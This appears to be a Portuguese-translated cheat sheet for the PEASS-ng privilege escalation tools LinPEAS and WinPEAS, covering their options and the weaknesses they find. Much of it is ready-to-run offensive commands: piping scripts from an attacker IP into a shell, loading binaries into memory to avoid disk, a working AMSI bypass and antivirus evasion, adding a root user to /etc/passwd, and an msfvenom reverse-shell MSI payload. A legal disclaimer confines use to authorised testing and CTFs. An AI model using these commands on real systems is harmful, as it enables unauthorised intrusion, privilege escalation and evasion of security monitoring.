<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🦹 PEASS-ng (LinPEAS e WinPEAS) - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ██████╗ ███████╗ █████╗ ███████╗███████╗      ███╗   ██╗ ██████╗ 
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝      ████╗  ██║██╔════╝ 
  ██████╔╝█████╗  ███████║███████╗███████╗█████╗██╔██╗ ██║██║  ███╗
  ██╔═══╝ ██╔══╝  ██╔══██║╚════██║╚════██║╚════╝██║╚██╗██║██║   ██║
  ██║     ███████╗██║  ██║███████║███████║      ██║ ╚████║╚██████╔╝
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝      ╚═╝  ╚═══╝ ╚═════╝ 
             LinPEAS & WinPEAS Privilege Escalation Suite
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/PEASS--ng-PrivEsc-red?style=for-the-badge" alt="PEASS-ng">
  <img src="https://img.shields.io/badge/LinPEAS-Linux_PrivEsc-blue?style=for-the-badge" alt="LinPEAS">
  <img src="https://img.shields.io/badge/WinPEAS-Windows_PrivEsc-orange?style=for-the-badge" alt="WinPEAS">
  <img src="https://img.shields.io/badge/Automated-Enumeration-green?style=for-the-badge" alt="Automated">
</p>

<p alinhar="centro">
  <b>🔍 As ferramentas automatizadas de escalonamento de privilégios mais populares do mundo para sistemas Linux e Windows</b>
</p>

---

## 📋 Índice

- [Introdução](#-introdução)
- [Legenda de cores e como ler a saída](#-color-legend--how-to-read-output)
- [LinPEAS (escalonamento de privilégios Linux)](#-linpeas-linux-privilege-escalation)
  - [Download e execução na memória](#download--execução na memória)
  - [Opções de linha de comando](#opções de linha de comando)
  - [Vetores principais verificados por LinPEAS](#core-vectors-checked-by-linpeas)
  - [Furtividade e Evasão AV](#stealth--av-evasion)
- [WinPEAS (escalonamento de privilégios do Windows)](#-winpeas-windows-privilege-escalation)
  - [Métodos de execução (.exe vs .bat)](#execution-methods-exe-vs-bat)
  - [Executando WinPEAS na memória](#running-winpeas-in-memory)
  - [Vetores principais verificados pelo WinPEAS](#core-vectors-checked-by-winpeas)
  - [Ignorando o Windows Defender e AMSI](#bypassing-windows-defender--amsi)
- [Interpretação de descobertas de alta prioridade](#-interpretação de descobertas de alta prioridade)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Dicas e práticas recomendadas](#-dicas--melhores práticas)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução

**PEASS-ng** (Privilege Escalation Awesome Scripts SUITE - nova geração), criado por Carlos Polop, é a coleção padrão de fato de ferramentas de auditoria automatizadas usadas para descobrir vetores de escalonamento de privilégios em sistemas comprometidos:

- **LinPEAS:** Um script Bash completo que procura configurações incorretas, credenciais, arquivos graváveis, binários SUID, explorações de kernel, tarefas cron e contêineres em sistemas Linux/Unix.
- **WinPEAS:** Disponível como binário .NET compilado independente (`winPEASany.exe`, `winPEASx64.exe`) e script em lote leve (`winPEAS.bat`) para auditoria de estações de trabalho Windows, membros de domínio e servidores.

---

## 🎨 Legenda de cores e como ler a saída

O poder definidor do PEASS é seu sistema automatizado de classificação de cores:

| Cor | Significância | Significado |
|-------|-------------|---------|
| 🔴 **VERMELHO/AMARELO** | 🚨 **CRÍTICO (99% PrivEsc)** | Vetor de escalonamento de privilégios altamente confiável. Deve verificar imediatamente! |
| 🔴 **VERMELHO** | ⚠️ **Interessante** | Configuração incomum, configuração não padrão ou candidato a credencial. |
| 🟡 **AMARELO** | ℹ️ **Informativo** | Descoberta notável que pode fazer parte de uma cadeia de exploração. |
| 🔵 **CIANO / AZUL** | 👥 **Contexto** | Usuários, grupos e informações padrão do sistema. |

> **Regra de ouro:** Vá diretamente para os destaques **VERMELHO/AMARELO** primeiro! Se você vir um texto com fundo amarelo e letras vermelhas, um vetor de exploração é quase garantido.

---

## 🐧 LinPEAS (escalonamento de privilégios do Linux)

### Download e execução na memória

Você raramente precisa gravar `linpeas.sh` no disco. Execute-o diretamente na memória usando utilitários padrão do UNIX:
```bash
# 1. From attacker Python web server directly into bash
curl -L http://10.10.14.5:8000/linpeas.sh | sh

# Alternative using wget
wget -q -O - http://10.10.14.5:8000/linpeas.sh | sh

# 2. Download from official GitHub directly (if target has outbound internet access)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 3. Save output to file and review with colors preserved
./linpeas.sh -a > /tmp/linpeas.txt
less -r /tmp/linpeas.txt
```
### Opções de linha de comando
```bash
# Run all checks (including slower exhaustive searches)
./linpeas.sh -a

# Fast mode (skips slow regex / deep file checks)
./linpeas.sh -q

# Password provided for automated 'sudo -l' testing
./linpeas.sh -p 'KnownPassword123'

# Network-only checks (active connections, ARP cache, listening ports)
./linpeas.sh -N

# System information only
./linpeas.sh -s
```
### Vetores principais verificados pelo LinPEAS

1. **Configurações incorretas do Sudo (`sudo -l`):**
   - Comandos executáveis como root sem senha (`NOPASSWD`).
   - Reutilização de token Sudo / CVE-2021-3156 (Barão Samedit).
2. **Binários SUID/SGID:**
   - Binários com permissões de root (`chmod +s`). Referência cruzada com **GTFOBins**.
3. **Capacidades do Linux:**
   - Binários com capacidades elevadas como `cap_setuid+ep` (por exemplo, `python3`, `tar`, `perl`).
4. **Tarefas agendadas e cronômetros:**
   - Crontabs (`/etc/crontab`, `/var/spool/cron/*`) e scripts programados graváveis.
   - Temporizadores Systemd (`systemctl list-timers`).
5. **Sequestro de caminho e ambiente:**
   - Diretórios graváveis em `$PATH`, pesquisas relativas de comandos em scripts.
6. **Exploração do Kernel:**
   - Versão do kernel verificada em relação a explorações conhecidas (Dirty COW, Dirty Pipe, OverlayFS).
7. **Esmagamento de raiz NFS:**
   - Diretórios compartilhados montados com `no_root_squash` em `/etc/exports`.
8. **Coleta de credenciais:**
   - Senhas em texto simples em `.bash_history`, arquivos de configuração (`wp-config.php`, `.env`), chaves SSH (`id_rsa`) e despejos de memória.

---

## 🪟 WinPEAS (escalonamento de privilégios do Windows)

### Métodos de execução (.exe vs. .bat)

WinPEAS é fornecido em vários formatos:
- **`winPEASx64.exe`/`winPEASany.exe`:** Escrito em C#/.NET. Mais abrangente; executa verificações profundas de registro, API e credenciais.
- **`winPEAS.bat`:** Script em lote simples. Altamente compatível com versões herdadas do Windows, não requer dependências .NET e evita certas detecções binárias estáticas.
```cmd
:: Run winPEAS binary with full color output
winPEASx64.exe

:: Run stealthily and redirect to text file
winPEASx64.exe > C:\Windows\Temp\out.txt

:: Fast check without heavy registry and file searches
winPEASx64.exe quiet
```
### Executando WinPEAS na memória

Para evitar salvar arquivos em disco em estações de trabalho auditadas, carregue o WinPEAS diretamente na memória do PowerShell:
```powershell
# In-memory execution using Net.WebClient
$pe = (New-Object System.Net.WebClient).DownloadData('http://10.10.14.5:8000/winPEASx64.exe')
[System.Reflection.Assembly]::Load($pe)
[winPEAS.Program]::Main("")
```
### Vetores principais verificados pelo WinPEAS

1. **Permissões de serviço e caminhos não citados:**
   - **Caminhos de serviço não citados:** Caminhos binários de serviço com espaços e sem aspas (`C:\Program Files\App\service.exe` -> o invasor coloca `C:\Program.exe`).
   - **Permissões de serviço fracas:** Usuários não administradores com `SERVICE_ALL_ACCESS` ou `SERVICE_CHANGE_CONFIG`.
2. **Sequestro de DLL:**
   - Serviços que tentam carregar DLLs inexistentes de diretórios graváveis pelo usuário.
3. **SempreInstalarElevado:**
   - Chaves de registro `AlwaysInstallElevated = 1` permitindo que qualquer usuário instale pacotes MSI elevados com `msiexec`.
4. **Privilégios de token (SeImpersonate/SeAssignPrimaryToken):**
   - Explorável por meio de exploits de batata (SweetPotato, GodPotato, PrintSpoofer) para elevar de contas de serviço (`IIS APPPOOL`, `LOCAL SERVICE`) para `NT AUTHORITY\SYSTEM`.
5. **Lojas de credenciais e logon automático:**
   - Senhas em texto não criptografado no Registro (`DefaultPassword` no Winlogon).
   - Conexões RDP salvas, credenciais do Vault, blobs DPAPI, sessões PuTTY, senhas WiFi.
6. **Arquivos de backup do SAM e do SISTEMA:**
   - Cópias graváveis ou legíveis de `C:\Windows\Repair\SAM` ou `C:\Windows\System32\config\RegBack\SAM`.

### Ignorando o Windows Defender e AMSI

O Windows Defender sinaliza ativamente versões compiladas do `winPEASx64.exe`. Para executar o WinPEAS em ambientes monitorados:
```powershell
# 1. Obfuscate winPEAS binary using Invisibility / Donut or custom compiler
# 2. Patch AMSI in PowerShell session before running in memory:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Alternatively, fall back to winPEAS.bat (often unflagged by AV):
curl.exe http://10.10.14.5:8000/winPEAS.bat -o %TEMP%\wp.bat && %TEMP%\wp.bat
```
---

## 🎯 Interpretando descobertas de alta prioridade

### 1. LinPEAS: `/etc/passwd` gravável
Se LinPEAS marcar `/etc/passwd` em **VERMELHO/AMARELO**:
```bash
# Generate password hash:
openssl passwd -1 -salt evil SaltPass123
# Append root user:
echo 'root2:$1$evil$TNy7V...:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
### 2. WinPEAS: `SeImpersonatePrivilege` presente
Se você segurar `SeImpersonatePrivilege`:
```powershell
# Elevate instantly using GodPotato or PrintSpoofer:
.\GodPotato-NET4.exe -cmd "cmd.exe /c whoami"
```
### 3. WinPEAS: `AlwaysInstallElevated` definido como 1
```powershell
# Generate malicious MSI payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o priv.msi
# Run installer as low-privileged user:
msiexec /quiet /qn /i priv.msi
```
---

## 📊 Tabela de referência rápida

| Alvo | Comando | Finalidade |
|--------|---------|---------|
| **Linux (Remoto)** | `curl -L http://<IP>/linpeas.sh \| sh` | Execução na memória sem tocar no disco |
| **Linux (Local)** | `./linpeas.sh -a > out.txt` | Auditoria completa salva em arquivo de texto |
| **Linux (Rápido)** | `./linpeas.sh -q` | Verificação rápida ignorando pesquisas lentas de arquivos |
| **Windows (CLI)** | `winPEASx64.exe quiet` | Execução rápida com ruído reduzido |
| **Janelas (Memória)**| `[System.Reflection.Assembly]::Load($pe)` | Carregar binário .NET na memória via PowerShell |
| **Windows (lote)** | `winPEAS.bat` | Execução livre de dependência para evasão de legado/AV |

---

## 💡 Dicas e práticas recomendadas

1. **Revise a saída usando `less -r`:**
   Ao redirecionar a saída para um arquivo (`./linpeas.sh > linpeas.txt`), sempre visualize-o usando `less -r linpeas.txt` ou `cat linpeas.txt` para que os códigos de escape de cores ANSI do terminal sejam renderizados corretamente.
2. **Transferência via Porta 80/443:**
   Ao preparar LinPEAS ou WinPEAS na caixa do invasor, hospede seu servidor web na porta `80` ou `443` usando `python3 -m http.server 80` para ignorar regras estritas de saída do firewall de destino.
3. **Não negligencie as credenciais ocultas:**
   Verifique as seções “Arquivos interessantes” e “Credenciais de nuvem” da saída do LinPEAS; muitas vezes, tokens de API de texto simples ou credenciais da AWS concedem privilégios mais elevados do que uma exploração local.

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** Os scripts PEASS-ng realizam auditoria interna abrangente e descoberta de configuração. Eles só devem ser executados em sistemas onde você tenha permissão documentada durante testes de penetração autorizados, exercícios de CTF ou auditorias de segurança interna.

---

## 📚 Recursos

- [Repositório oficial do GitHub PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- [HackTricks Cloud & Privilege Escalation Bible](https://book.hacktricks.xyz/)
- [GTFOBins - Exploração de Binários Unix](https://gtfobins.github.io/)
- [LOLBAS - Windows vivendo fora da terra](https://lolbas-project.github.io/)